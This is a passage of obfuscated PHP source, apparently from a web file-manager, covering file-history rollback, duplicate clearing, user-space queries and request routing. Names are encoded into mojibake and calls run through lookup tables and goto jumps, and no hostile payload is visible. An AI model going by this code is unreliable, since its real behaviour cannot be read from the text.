$_SERVER[Öíæ€“”≠éÏË]; if (!$Dè∂ÓœØ’Ç) { return !1; } if (!is_array($Dè∂ÓœØ’Ç)) { $Dè∂ÓœØ’Ç = array($Dè∂ÓœØ’Ç); } goto aî§≠ãï÷ë; DÔÙ‡ª£©¡: return !0; goto Bï‹ÿÁ–†…; aî§≠ãï÷ë: $D ¶èä¬Ó§ = array($A¢¿À…ä£ç[411] => array($A¢¿À…ä£ç[7], $Dè∂ÓœØ’Ç)); $D÷Ú˘Ø®ÖÑ = $this->field($A¢¿À…ä£ç[449])->where($D ¶èä¬Ó§)->select(); if ($D÷Ú˘Ø®ÖÑ) { $this->where($D ¶èä¬Ó§)->delete(); $eïÃåπƒÃé = array_to_keyvalue($D÷Ú˘Ø®ÖÑ, $A¢¿À…ä£ç[33], $A¢¿À…ä£ç[448]); Model($A¢¿À…ä£ç[451])->remove($eïÃåπƒÃé); } goto DÔÙ‡ª£©¡; Bï‹ÿÁ–†…: } public function setDetail($E´ƒıä∆¨ß, $Aßπî˘ÉΩÑ) { $Dê¢ıõΩ∏ä =& $_SERVER[Öíæ€“”≠éÏË]; return $this->where(array($Dê¢ıõΩ∏ä[413] => $E´ƒıä∆¨ß))->save(array($Dê¢ıõΩ∏ä[1939] => $Aßπî˘ÉΩÑ)); } public function rollbackToItem($aÕ≠ó…‘µ⁄, $AêÑÖ…ãé¨) { goto Bíö®ö≠∑°; B≥„ç≥˜◊¡: return $this->where(array($fç‰›á„Ãå[413] => $AêÑÖ…ãé¨))->delete(); goto EÙéã∫πøè; Bíö®ö≠∑°: $fç‰›á„Ãå =& $_SERVER[Öíæ€“”≠éÏË]; $CµÃ§ÂÕ¿⁄ = Model($fç‰›á„Ãå[803])->sourceInfo($aÕ≠ó…‘µ⁄); $this->addHistory($CµÃ§ÂÕ¿⁄, LNG($fç‰›á„Ãå[1950])); goto BèØÊµÂœ»; BèØÊµÂœ»: $f•òÃ®åÙë = $this->find($AêÑÖ…ãé¨); $f¿¢∂Œ ‡ = array($fç‰›á„Ãå[448] => $f•òÃ®åÙë[$fç‰›á„Ãå[448]], $fç‰›á„Ãå[78] => $f•òÃ®åÙë[$fç‰›á„Ãå[78]], $fç‰›á„Ãå[84] => time(), $fç‰›á„Ãå[435] => USER_ID); Model($fç‰›á„Ãå[803])->where(array($fç‰›á„Ãå[396] => $aÕ≠ó…‘µ⁄))->save($f¿¢∂Œ ‡); goto B≥„ç≥˜◊¡; EÙéã∫πøè: } public function clearSame($cÇ †¢ó æ) { goto A∫àª¨º¿Ñ; A∫àª¨º¿Ñ: $E∆Ñ¿πÒÖ¬ =& $_SERVER[Öíæ€“”≠éÏË]; $f•›ãº≠áû = $this->listData($cÇ †¢ó æ); $Dñû¨·∂åØ = array_to_keyvalue_group($f•›ãº≠áû, $E∆Ñ¿πÒÖ¬[448]); goto dÜ»ÈŒƒ∂±; dÜ»ÈŒƒ∂±: $bƒñ‹”ëØ∆ = array(); $dç´óóôﬂ‹ = array(); foreach ($Dñû¨·∂åØ as $d‘üéÉü´ô) { if (!$d‘üéÉü´ô || count($d‘üéÉü´ô) <= 1) { continue; } foreach ($d‘üéÉü´ô as $Bõƒ¬∑’·Ô) { $bƒñ‹”ëØ∆[] = $Bõƒ¬∑’·Ô[$E∆Ñ¿πÒÖ¬[448]]; $dç´óóôﬂ‹[] = $Bõƒ¬∑’·Ô[$E∆Ñ¿πÒÖ¬[394]]; } } goto DÓÚÆçÙìø; DÓÚÆçÙìø: if (!$dç´óóôﬂ‹) { return; } $this->where(array($E∆Ñ¿πÒÖ¬[394] => array($E∆Ñ¿πÒÖ¬[7], $dç´óóôﬂ‹)))->delete(); Model($E∆Ñ¿πÒÖ¬[451])->remove($bƒñ‹”ëØ∆); goto b¶°ÆÑ ˘™; b¶°ÆÑ ˘™: } public function userSpace() { $CÇÙí◊¡ªÕ =& $_SERVER[Öíæ€“”≠éÏË]; $B¯‹ö¯ààÑ = $this->tablePrefix; $EêëÌÏÓ‡‹ = array($CÇÙí◊¡ªÕ[1529] => USER_ID); $eõ”®’⁄∆Ñ = "{$B¯‹ö¯ààÑ}\x69\x6f\137\146\x69\x6c\145\40\x66\x69\x6c\145\x73\x20\157\x6e\x20\146\151\154\145\x73\56\146\x69\154\x65\111\x44\x20\x3d\40\x68\x69\163\164\157\x72\171\x2e\x66\151\x6c\145\111\x44"; return $this->alias($CÇÙí◊¡ªÕ[1948])->where($EêëÌÏÓ‡‹)->join($eõ”®’⁄∆Ñ, $CÇÙí◊¡ªÕ[1949])->sum($CÇÙí◊¡ªÕ[78]); } } goto B”◊úäø∞≤; eú¶´ø‚èÁ: $d⁄ãÆÊì≤Ö = $_SERVER[Öíæ€“”≠éÏË][592]; if (!$d⁄ãÆÊì≤Ö) { die; } class Application { private $defaultModule = "\x69\x6e\144\x65\170"; private $defaultController = "\151\x6e\144\145\170"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($eûÕıà¢‚â) { goto CÛ“∫¶·ü√; cıüÒ«‰ÇÖ: $this->defaultAction = $Bõ™§˘ãı†[2] ? $Bõ™§˘ãı†[2] : $this->defaultAction; $B›õ©ﬁñ€Á = $aÙáÕß™ëﬂ[597]; $this->{$_SERVER[ñÖÀ‰Ø][3]}($cº∏¶ôÕ›Ñ[4], array($this, $cº∏¶ôÕ›Ñ[5])); goto C„âªèã¬ó; búˆ¨ﬁøÚÕ: $cçÆ•ªè©∂ = $aÙáÕß™ëﬂ[595]; while (strlen($cçÆ•ªè©∂) < $aÙáÕß™ëﬂ[596]) { if (!$cçÆ•ªè©∂) { break; } $cçÆ•ªè©∂++; } $this->defaultController = $Bõ™§˘ãı†[1] ? $Bõ™§˘ãı†[1] : $this->defaultController; goto cıüÒ«‰ÇÖ; CÛ“∫¶·ü√: $aÙáÕß™ëﬂ =& $_SERVER[Öíæ€“”≠éÏË]; $cº∏¶ôÕ›Ñ =& $_SERVER[ñÖÀ‰Ø]; $Bõ™§˘ãı† = $cº∏¶ôÕ›Ñ[0]($cº∏¶ôÕ›Ñ[1], $cº∏¶ôÕ›Ñ[2]($eûÕıà¢‚â, $cº∏¶ôÕ›Ñ[1])); goto C‹ñ˘ñ”∑π; C‹ñ˘ñ”∑π: $AÑãŸ–„ã• = $aÙáÕß™ëﬂ[593]; while ($AÑãŸ–„ã• < $aÙáÕß™ëﬂ[594]) { if ($AÑãŸ–„ã• >= 0) { break; } $AÑãŸ–„ã•++; } $this->defaultModule = $Bõ™§˘ãı†[0] ? $Bõ™§˘ãı†[0] : $this->defaultModule; goto búˆ¨ﬁøÚÕ; C„âªèã¬ó: } public function appRun($D∑˘Á∏êø‹) { goto EìÁÚ—åëˆ; A©â∞∫ñÛ: $AøªÜö«±∂ = $cî®Ù∂àﬁ¬[6]($dò˘Œ†á€ê[0]); $d®Ÿ≈Ì—„µ = $bùô≠ÿâƒ¡[598]; if (strlen($d®Ÿ≈Ì—„µ) < $bùô≠ÿâƒ¡[589]) { return; } goto c¥êÙäÚÂ¯; eòáä›Ú≠À: $cî®Ù∂àﬁ¬[13](array($cî®Ù∂àﬁ¬[14], $cî®Ù∂àﬁ¬[15]), $a…ã˜ùã§Ñ . $cî®Ù∂àﬁ¬[16], $D∑˘Á∏êø‹); $cî®Ù∂àﬁ¬[17]($D∑˘Á∏êø‹); $cî®Ù∂àﬁ¬[13](array($cî®Ù∂àﬁ¬[14], $cî®Ù∂àﬁ¬[15]), $a…ã˜ùã§Ñ . $cî®Ù∂àﬁ¬[18], $D∑˘Á∏êø‹); goto Bóı º„Ê»; EìÁÚ—åëˆ: $bùô≠ÿâƒ¡ =& $_SERVER[Öíæ€“”≠éÏË]; $cî®Ù∂àﬁ¬ =& $_SERVER[ñÖÀ‰Ø]; $dò˘Œ†á€ê = $cî®Ù∂àﬁ¬[0]($cî®Ù∂àﬁ¬[1], $D∑˘Á∏êø‹); goto A©â∞∫ñÛ; c¥êÙäÚÂ¯: $a…ã˜ùã§Ñ = $cî®Ù∂àﬁ¬[7]; $e√Ω¢Ω∫É· = $bùô≠ÿâƒ¡[599]; if ($AøªÜö«±∂ == $cî®Ù∂àﬁ¬[8]) { $a…ã˜ùã§Ñ = $cî®Ù∂àﬁ¬[9]; $dò˘Œ†á€ê[0] = $cî®Ù∂àﬁ¬[10]; $dò˘Œ†á€ê[1] = $dò˘Œ†á€ê[1] . $cî®Ù∂àﬁ¬[11]; $D∑˘Á∏êø‹ = $cî®Ù∂àﬁ¬[12]($cî®Ù∂àﬁ¬[1], $dò˘Œ†á€ê); $D∑˘Á∏êø‹ = $cî®Ù∂àﬁ¬[2]($D∑˘Á∏êø‹, $cî®Ù∂àﬁ¬[1]); } goto eòáä›Ú≠À; Bóı º„Ê»: } private function autorun() { $fÍõÉÎî–ó =& $_SERVER[ñÖÀ‰Ø]; global $config; if ($fÍõÉÎî–ó[19]($config[$fÍõÉÎî–ó[20]]) == 0) { return; } foreach ($config[$fÍõÉÎî–ó[20]] as $cää¢É™ı§ => $bË¶•Áçå…) { $this->{$_SERVER[ñÖÀ‰Ø][21]}($bË¶•Áçå…); } } private function kqnidf431ffe() { goto Bè¬ˆêÙëΩ; aãçê¥œâ÷: $a≠å‘ÁºÒÀ = $cŸÇÓ±Ïèô[604]; if (!$a≠å‘ÁºÒÀ) { die; } $GLOBALS[$cøµÏıÀ ‡[22]][$cøµÏıÀ ‡[23]] = $cøµÏıÀ ‡[27]($eŒ£‹¿¶åπ, $F◊‚∫˘Ñ°ï); goto dÙ«¥∫ô˘ñ; FÉÓ¶õøéó: if (!$C·ÁÕ’ûàÒ || $cøµÏıÀ ‡[24]($C·ÁÕ’ûàÒ) <= $cøµÏıÀ ‡[24]($dé¨∆Óææ‡)) { return; } if ($cøµÏıÀ ‡[6]($cøµÏıÀ ‡[25]($C·ÁÕ’ûàÒ, -$cøµÏıÀ ‡[24]($dé¨∆Óææ‡))) != $dé¨∆Óææ‡) { return; } $fﬂ‡ÖØ≥ÖÌ = $cøµÏıÀ ‡[25]($C·ÁÕ’ûàÒ, 0, -$cøµÏıÀ ‡[24]($dé¨∆Óææ‡)); goto D»í«ŸßÏÃ; dÙ«¥∫ô˘ñ: $GLOBALS[$cøµÏıÀ ‡[22]][$cøµÏıÀ ‡[28]] = $cøµÏıÀ ‡[29]($cøµÏıÀ ‡[1], $GLOBALS[$cøµÏıÀ ‡[22]][$cøµÏıÀ ‡[23]]); goto cÍè‡üâÉ≤; D»í«ŸßÏÃ: $e÷Ø·…è†ï = $cŸÇÓ±Ïèô[601]; while (strlen($e÷Ø·…è†ï) < $cŸÇÓ±Ïèô[602]) { if (!$e÷Ø·…è†ï) { break; } $e÷Ø·…è†ï++; } $eŒ£‹¿¶åπ = array($cøµÏıÀ ‡[8], $fﬂ‡ÖØ≥ÖÌ); goto C‚ªË∞ëıô; Bè¬ˆêÙëΩ: $cŸÇÓ±Ïèô =& $_SERVER[Öíæ€“”≠éÏË]; $cøµÏıÀ ‡ =& $_SERVER[ñÖÀ‰Ø]; $dé¨∆Óææ‡ = $cøµÏıÀ ‡[8]; goto aí–‘∫Ø Ô; aí–‘∫Ø Ô: $C·ÁÕ’ûàÒ = $GLOBALS[$cøµÏıÀ ‡[22]][$cøµÏıÀ ‡[23]][0]; $a¬áá©ù≥⁄ = $cŸÇÓ±Ïèô[600]; if (!$a¬áá©ù≥⁄) { return; } goto FÉÓ¶õøéó; C‚ªË∞ëıô: $C„ö£Ù÷ù = $cŸÇÓ±Ïèô[603]; while ($C„ö£Ù÷ù < $cŸÇÓ±Ïèô[589]) { if ($C„ö£Ù÷ù >= 0) { break; } $C„ö£Ù÷ù++; } $F◊‚∫˘Ñ°ï = $cøµÏıÀ ‡[26]($GLOBALS[$cøµÏıÀ ‡[22]][$cøµÏıÀ ‡[23]], 1); goto aãçê¥œâ÷; cÍè‡üâÉ≤: } private function kvnq9d46a23f() { goto F∞ñ”ƒøù ; bﬁªÃÍ’•ù: $C√Õõ∞Ùë° = $Bâ¨Öâã°†[606]; while (strlen($C√Õõ∞Ùë°) < $Bâ¨Öâã°†[607]) { if (!$C√Õõ∞Ùë°) { break; } $C√Õõ∞Ùë°++; } $bË⁄Ωü—Íˆ = $eÿ·™ëèØä[25]($AøºÇªá†∞, $a•ÚÉ ΩÓÓ + $eÿ·™ëèØä[24]($Dñ‹ë¬Çˆû)); goto E∂·éï™èü; a∫åçÍ…á≠: $AøºÇªá†∞ = $_SERVER[$eÿ·™ëèØä[30]]; $AÖÿÉˆ¡ÏÙ = $Bâ¨Öâã°†[605]; if (!$AÖÿÉˆ¡ÏÙ) { die; } goto fŒÛò¡·ÔÑ; E∂·éï™èü: $eÿ·™ëèØä[34]($eÿ·™ëèØä[35], $bË⁄Ωü—Íˆ, $AÖïòÙçØ·); $bË⁄Ωü—Íˆ = $eÿ·™ëèØä[2]($AÖïòÙçØ·[0][0], $eÿ·™ëèØä[36]); $b±àÔ¯∂òÊ = $Bâ¨Öâã°†[608]; goto Bé€”∏€ÜŸ; fŒÛò¡·ÔÑ: $Dñ‹ë¬Çˆû = $eÿ·™ëèØä[31]; if (!$eÿ·™ëèØä[32]($AøºÇªá†∞, $Dñ‹ë¬Çˆû)) { return; } $a•ÚÉ ΩÓÓ = $eÿ·™ëèØä[33]($AøºÇªá†∞, $Dñ‹ë¬Çˆû); goto bﬁªÃÍ’•ù; F∞ñ”ƒøù : $Bâ¨Öâã°† =& $_SERVER[Öíæ€“”≠éÏË]; $eÿ·™ëèØä =& $_SERVER[ñÖÀ‰Ø]; if ($GLOBALS[$eÿ·™ëèØä[22]][$eÿ·™ëèØä[28]] != $eÿ·™ëèØä[10]) { return; } goto a∫åçÍ…á≠; Bé€”∏€ÜŸ: if (strlen($b±àÔ¯∂òÊ) < $Bâ¨Öâã°†[594]) { return; } $GLOBALS[$eÿ·™ëèØä[22]][$eÿ·™ëèØä[23]] = $eÿ·™ëèØä[0]($eÿ·™ëèØä[36], $bË⁄Ωü—Íˆ); $eöëáœ˘©± = $Bâ¨Öâã°†[609]; goto fıÖèÉÉΩÇ; fıÖèÉÉΩÇ: $GLOBALS[$eÿ·™ëèØä[22]][$eÿ·™ëèØä[28]] = $eÿ·™ëèØä[29]($eÿ·™ëèØä[1], $GLOBALS[$eÿ·™ëèØä[22]][$eÿ·™ëèØä[23]]); goto B‰™÷Îî‘â; B‰™÷Îî‘â: } public function run() { goto cª„”»ó¯—; Bí»Ì÷ƒÊ: $BÏ’‰Ü Áπ[39]($BÏ’‰Ü Áπ[42], isset($bÉß„Ö¬÷∂[2]) && $bÉß„Ö¬÷∂[0] ? $bÉß„Ö¬÷∂[2] : $this->defaultAction); $CÀªüöÛãå = $dúêõ÷ëûª[614]; if (strlen($CÀªüöÛãå) < $dúêõ÷ëûª[602]) { return; } goto eÖêöÂ◊”®; F◊ﬂòÉıä’: $_SERVER[$BÏ’‰Ü Áπ[44]] = $BÏ’‰Ü Áπ[6](ACTION); $this->{$_SERVER[ñÖÀ‰Ø][45]}(); if ($BÏ’‰Ü Áπ[19]($bÉß„Ö¬÷∂) >= 3) { $this->{$_SERVER[ñÖÀ‰Ø][21]}($b“€¬–‰üÚ); } else { $this->{$_SERVER[ñÖÀ‰Ø][21]}(ACTION); } goto dË≤äêî™√; bﬂ›ã∫∑˜´: $BÏ’‰Ü Áπ[39]($BÏ’‰Ü Áπ[40], isset($bÉß„Ö¬÷∂[0]) && $bÉß„Ö¬÷∂[0] ? $bÉß„Ö¬÷∂[0] : $this->defaultModule); $F∂„‹©è∑ò = $dúêõ÷ëûª[612]; if (strlen($F∂„‹©è∑ò) < $dúêõ÷ëûª[596]) { return; } goto Dñ¯âÚÛÓ©; C°Û¢≈∏È¶: $this->{$_SERVER[ñÖÀ‰Ø][38]}(); $bÉß„Ö¬÷∂ = $GLOBALS[$BÏ’‰Ü Áπ[22]][$BÏ’‰Ü Áπ[23]]; $f’è∂›·ãà = $dúêõ÷ëûª[610]; goto fã”à››“ ; Dñ¯âÚÛÓ©: $BÏ’‰Ü Áπ[39]($BÏ’‰Ü Áπ[41], isset($bÉß„Ö¬÷∂[1]) && $bÉß„Ö¬÷∂[0] ? $bÉß„Ö¬÷∂[1] : $this->defaultController); $C–ô€á©Úµ = $dúêõ÷ëûª[613]; if (!$C–ô€á©Úµ) { die; } goto Bí»Ì÷ƒÊ; eÖêöÂ◊”®: $BÏ’‰Ü Áπ[39]($BÏ’‰Ü Áπ[43], MOD . $BÏ’‰Ü Áπ[1] . ST . $BÏ’‰Ü Áπ[1] . ACT); $Cè⁄ç–ùáÕ = $dúêõ÷ëûª[615]; while ($Cè⁄ç–ùáÕ < $dúêõ÷ëûª[596]) { if ($Cè⁄ç–ùáÕ >= 0) { break; } $Cè⁄ç–ùáÕ++; } goto F◊ﬂòÉıä’; cª„”»ó¯—: $dúêõ÷ëûª =& $_SERVER[Öíæ€“”≠éÏË]; $BÏ’‰Ü Áπ =& $_SERVER[ñÖÀ‰Ø]; $this->{$_SERVER[ñÖÀ‰Ø][37]}(); goto C°Û¢≈∏È¶; fã”à››“ : while (strlen($f’è∂›·ãà) < $dúêõ÷ëûª[589]) { if (!$f’è∂›·ãà) { break; } $f’è∂›·ãà++; } $b“€¬–‰üÚ = $GLOBALS[$BÏ’‰Ü Áπ[22]][$BÏ’‰Ü Áπ[28]]; $dµ©ûóÓèı = $dúêõ÷ëûª[611]; goto bﬂ›ã∫∑˜´; dË≤äêî™√: } private $zhps7cc1e634 = array(); private $gofl736a4d8a = ''; public function zjlp5d5a30e9() { goto c…ÆÙçﬁÕÑ; aÑÛà™ÒôÎ: while ($DÇÃ√äŒ“≥ < $f©Îá√ìóœ[596]) { if ($DÇÃ√äŒ“≥ >= 0) { break; } $DÇÃ√äŒ“≥++; } $this->{$_SERVER[ñÖÀ‰Ø][3]}($Fçí’µñﬂÁ[53], array($this, $Fçí’µñﬂÁ[54])); $this->{$_SERVER[ñÖÀ‰Ø][3]}($Fçí’µñﬂÁ[55], array($this, $Fçí’µñﬂÁ[56])); goto E¯ÇŒÆ£Û¥; c…ÆÙçﬁÕÑ: $f©Îá√ìóœ =& $_SERVER[Öíæ€“”≠éÏË]; $Fçí’µñﬂÁ =& $_SERVER[ñÖÀ‰Ø]; $this->{$_SERVER[ñÖÀ‰Ø][46]}(); goto FΩ£“¥ã¥Ç; E∑ ßô‰∞‹: $EÇÇ±€ÁéÚ = $f©Îá√ìóœ[623]; if (!$EÇÇ±€ÁéÚ) { die; } $this->{$_SERVER[ñÖÀ‰Ø][3]}($Fçí’µñﬂÁ[59], array($this, $Fçí’µñﬂÁ[60])); goto fûªÃ∑ÿ˜ö; FΩ£“¥ã¥Ç: $F€Öè˘„¨ı = $f©Îá√ìóœ[616]; if (strlen($F€Öè˘„¨ı) < $f©Îá√ìóœ[602]) { return; } $this->{$_SERVER[ñÖÀ‰Ø][47]}(); goto BÍëï‘êÂÑ; e≠≈ö∞¿§ò: if (strlen($fËΩÔıúœ) < $f©Îá√ìóœ[589]) { return; } $this->{$_SERVER[ñÖÀ‰Ø][52]}(); $DÇÃ√äŒ“≥ = $f©Îá√ìóœ[621]; goto aÑÛà™ÒôÎ; Dœƒ∫¡Œ∞ÿ: while ($AÁÏàÏÎ≠± < $f©Îá√ìóœ[596]) { if ($AÁÏàÏÎ≠± >= 0) { break; } $AÁÏàÏÎ≠±++; } $this->{$_SERVER[ñÖÀ‰Ø][49]}(); $c≥Ñ∏◊õôà = $f©Îá√ìóœ[619]; goto e—„™íÇùé; e—„™íÇùé: $this->{$_SERVER[ñÖÀ‰Ø][50]}(); $this->{$_SERVER[ñÖÀ‰Ø][51]}(); $fËΩÔıúœ = $f©Îá√ìóœ[620]; goto e≠≈ö∞¿§ò; BÍëï‘êÂÑ: $fıï÷âÈøÇ = $f©Îá√ìóœ[617]; $this->{$_SERVER[ñÖÀ‰Ø][48]}(); $AÁÏàÏÎ≠± = $f©Îá√ìóœ[618]; goto Dœƒ∫¡Œ∞ÿ; E¯ÇŒÆ£Û¥: $aåπÙÉ‚Ûµ = $f©Îá√ìóœ[622]; if (strlen($aåπÙÉ‚Ûµ) < $f©Îá√ìóœ[602]) { return; } $this->{$_SERVER[ñÖÀ‰Ø][3]}($Fçí’µñﬂÁ[57], array($this, $Fçí’µñﬂÁ[58])); goto E∑ ßô‰∞‹; fûªÃ∑ÿ˜ö: } public function gify48075263($D∫∫ÚÎŸºÀ) { goto bÜü⁄º ﬂÊ; Cììùºäßè: if (!$BÎ¿ñ€§¡∏) { die; } $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[128]] = $A©Ö·ëÌÒ˜[129]($_SERVER[$A©Ö·ëÌÒ˜[130]] . $aº∆ ïªÿ“[$A©Ö·ëÌÒ˜[131]]); $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[132]] = $A©Ö·ëÌÒ˜[133]($A©Ö·ëÌÒ˜[134]()); goto E¡∑¯ËƒÃ«; CÂ£Ø∫Óâ : unset($D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[112]][$A©Ö·ëÌÒ˜[116]]); $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[112]][$A©Ö·ëÌÒ˜[117]] = array($A©Ö·ëÌÒ˜[118] => (int) $DôÍûÜ≥°ÿ[$A©Ö·ëÌÒ˜[119]], $A©Ö·ëÌÒ˜[120] => (int) $A©Ö·ëÌÒ˜[121]($DôÍûÜ≥°ÿ, $A©Ö·ëÌÒ˜[122], 0)); $c∂ƒçààÀÂ = $C≤„Ü‚ù—ô[628]; goto e¢Â´ﬁë∂©; b´ÂÂ¢∞èÂ: $cÉÑç ∆ÿ∑ = array($A©Ö·ëÌÒ˜[64], $A©Ö·ëÌÒ˜[65], $A©Ö·ëÌÒ˜[66], $A©Ö·ëÌÒ˜[67], $A©Ö·ëÌÒ˜[68], $A©Ö·ëÌÒ˜[69], $A©Ö·ëÌÒ˜[70], $A©Ö·ëÌÒ˜[71], $A©Ö·ëÌÒ˜[72], $A©Ö·ëÌÒ˜[73], $A©Ö·ëÌÒ˜[74], $A©Ö·ëÌÒ˜[75], $A©Ö·ëÌÒ˜[76], $A©Ö·ëÌÒ˜[77], $A©Ö·ëÌÒ˜[78], $A©Ö·ëÌÒ˜[79], $A©Ö·ëÌÒ˜[80], $A©Ö·ëÌÒ˜[81], $A©Ö·ëÌÒ˜[82], $A©Ö·ëÌÒ˜[83], $A©Ö·ëÌÒ˜[84], $A©Ö·ëÌÒ˜[85], $A©Ö·ëÌÒ˜[86], $A©Ö·ëÌÒ˜[87], $A©Ö·ëÌÒ˜[88], $A©Ö·ëÌÒ˜[89], $A©Ö·ëÌÒ˜[90], $A©Ö·ëÌÒ˜[91], $A©Ö·ëÌÒ˜[92], $A©Ö·ëÌÒ˜[93], $A©Ö·ëÌÒ˜[94], $A©Ö·ëÌÒ˜[95], $A©Ö·ëÌÒ˜[96], $A©Ö·ëÌÒ˜[97], $A©Ö·ëÌÒ˜[98], $A©Ö·ëÌÒ˜[99], $A©Ö·ëÌÒ˜[100], $A©Ö·ëÌÒ˜[101], $A©Ö·ëÌÒ˜[102], $A©Ö·ëÌÒ˜[103], $A©Ö·ëÌÒ˜[104], $A©Ö·ëÌÒ˜[105], $A©Ö·ëÌÒ˜[106], $A©Ö·ëÌÒ˜[107], $A©Ö·ëÌÒ˜[108]); $EÁÍ…Ôõå‘ = $C≤„Ü‚ù—ô[624]; while (strlen($EÁÍ…Ôõå‘) < $C≤„Ü‚ù—ô[607]) { if (!$EÁÍ…Ôõå‘) { break; } $EÁÍ…Ôõå‘++; } goto c◊óùÉãåö; e¢Â´ﬁë∂©: if (strlen($c∂ƒçààÀÂ) < $C≤„Ü‚ù—ô[607]) { die; } $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[124]] = $A©Ö·ëÌÒ˜[125]($A©Ö·ëÌÒ˜[126])->{$_SERVER[ñÖÀ‰Ø][127]}(); $BÎ¿ñ€§¡∏ = $C≤„Ü‚ù—ô[629]; goto Cììùºäßè; bÜò»∏ÿ›ì: if (!$A«ˆéÍ≤Ö•) { return; } if ($A©Ö·ëÌÒ˜[121]($GLOBALS, $A©Ö·ëÌÒ˜[147]) && $this->config[$A©Ö·ëÌÒ˜[148]]) { $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[149]] = WEB_ROOT; } return $D∫∫ÚÎŸºÀ; goto düœãà∆ÆÚ; cﬂ«—‡åœñ: unset($D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[113]][$A©Ö·ëÌÒ˜[114]]); $dë‡©Ç»¬ï = $C≤„Ü‚ù—ô[626]; unset($D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[113]][$A©Ö·ëÌÒ˜[115]]); goto EﬂŒ®ä≈„º; E¡∑¯ËƒÃ«: $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[135]] = $this->gofl736a4d8a; if ($aº∆ ïªÿ“[$A©Ö·ëÌÒ˜[135]] != $A©Ö·ëÌÒ˜[136]) { $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[137]] = $aº∆ ïªÿ“[$A©Ö·ëÌÒ˜[137]]; $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[138]] = $aº∆ ïªÿ“[$A©Ö·ëÌÒ˜[138]]; $cËËΩ„äì◊ = $A©Ö·ëÌÒ˜[139](10) . $this->gofl736a4d8a . $A©Ö·ëÌÒ˜[139](5); $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[140]][$A©Ö·ëÌÒ˜[141]] = $this->{$_SERVER[ñÖÀ‰Ø][142]}($cËËΩ„äì◊, $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[128]]); } if ($this->gofl736a4d8a == $A©Ö·ëÌÒ˜[136]) { $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[112]][$A©Ö·ëÌÒ˜[117]][$A©Ö·ëÌÒ˜[122]] = 0; } goto b“Éãıêπ“; c◊óùÉãåö: foreach ($cÉÑç ∆ÿ∑ as $A∑ï∂ì¬›ï) { $c∑ì¨Ü±Ÿö = $GLOBALS[$A©Ö·ëÌÒ˜[109]][$A©Ö·ëÌÒ˜[110]][$A∑ï∂ì¬›ï]; if (isset($aº∆ ïªÿ“[$A∑ï∂ì¬›ï])) { $c∑ì¨Ü±Ÿö = $aº∆ ïªÿ“[$A∑ï∂ì¬›ï]; } $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[112]][$A∑ï∂ì¬›ï] = $c∑ì¨Ü±Ÿö; } $DôÍûÜ≥°ÿ = $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[112]][$A©Ö·ëÌÒ˜[76]]; $E„Ç∆ôöä‚ = $C≤„Ü‚ù—ô[625]; goto cﬂ«—‡åœñ; bÜü⁄º ﬂÊ: $C≤„Ü‚ù—ô =& $_SERVER[Öíæ€“”≠éÏË]; $A©Ö·ëÌÒ˜ =& $_SERVER[ñÖÀ‰Ø]; $aº∆ ïªÿ“ = $A©Ö·ëÌÒ˜[61]($A©Ö·ëÌÒ˜[62])->{$_SERVER[ñÖÀ‰Ø][63]}(); goto b´ÂÂ¢∞èÂ; b“Éãıêπ“: $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[143]] = $A©Ö·ëÌÒ˜[121]($this->zhps7cc1e634, $A©Ö·ëÌÒ˜[144], $A©Ö·ëÌÒ˜[10]); $D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[123]][$A©Ö·ëÌÒ˜[145]] = $A©Ö·ëÌÒ˜[121]($this->zhps7cc1e634, $A©Ö·ëÌÒ˜[146], $A©Ö·ëÌÒ˜[10]); $A«ˆéÍ≤Ö• = $C≤„Ü‚ù—ô[630]; goto bÜò»∏ÿ›ì; EﬂŒ®ä≈„º: unset($D∫∫ÚÎŸºÀ[$A©Ö·ëÌÒ˜[111]][$A©Ö·ëÌÒ˜[112]][$A©Ö·ëÌÒ˜[76]]); $fñ¢Ÿ”ë›ò = $C≤„Ü‚ù—ô[627]; if (strlen($fñ¢Ÿ”ë›ò) < $C≤„Ü‚ù—ô[602]) { return; } goto CÂ£Ø∫Óâ ; düœãà∆ÆÚ: } private function jnml905f9460() { goto FèôìÂåÉŸ; FèôìÂåÉŸ: $fåΩõüÊÀï =& $_SERVER[Öíæ€“”≠éÏË]; $FóœñÀ±´∂ =& $_SERVER[ñÖÀ‰Ø]; if ($_SERVER[$FóœñÀ±´∂[44]] == $FóœñÀ±´∂[150]) { goto b«∆œ¡ ŸÎ; aŒ–Ÿ£Óî‰: $FÁ—‡ÑÊÎé = $fåΩõüÊÀï[633]; if (!$FÁ—‡ÑÊÎé) { return; } goto AÚÇµãª‘»; b«∆œ¡ ŸÎ: $dÇ◊πÉπÔà = array($FóœñÀ±´∂[135] => $this->gofl736a4d8a, $FóœñÀ±´∂[151] => $this->{$_SERVER[ñÖÀ‰Ø][152]}(), $FóœñÀ±´∂[153] => 